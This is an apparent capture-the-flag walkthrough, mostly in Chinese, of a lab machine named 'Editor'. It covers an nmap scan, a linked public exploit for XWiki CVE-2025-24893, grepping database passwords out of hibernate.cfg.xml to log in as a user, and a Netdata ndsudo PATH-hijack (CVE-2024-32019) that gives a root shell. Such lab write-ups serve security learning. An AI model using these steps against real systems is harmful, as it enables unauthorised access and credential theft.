## 扫描
```SHELL
$ nmap -sV -A 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 22:18 EDT
Nmap scan report for 10.10.11.80
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   173.26 ms 10.10.16.1
2   117.60 ms 10.10.11.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds
```
## CVE-2025-24893

![](attachments/Pasted%20image%2020250916105027.png)

[GitHub - gunzf0x/CVE-2025-24893: PoC for CVE-2025-24893: XWiki' Remote Code Execution exploit for versions prior to 15.10.11, 16.4.1 and 16.5.0RC1.](https://github.com/gunzf0x/CVE-2025-24893)
![](attachments/Pasted%20image%2020250916105050.png)

## 

```XML
cat hibernate.cfg.xml | grep pass
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>

```

密码登陆oliver
![](attachments/Pasted%20image%2020250916110515.png)



## netdata提权

[GitHub - T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC：Netdata ndsudo 权限提升 PoC --- GitHub - T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC: Netdata ndsudo Privilege Escalation PoC](https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC)

```SHELL
oliver@editor:~$ chmod +x nvme
oliver@editor:~$ export PATH=/home/oliver:$PATH
oliver@editor:~$ /opt/netdata/usr/lib
lib/     libexec/ 
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/home/oliver# ls
```

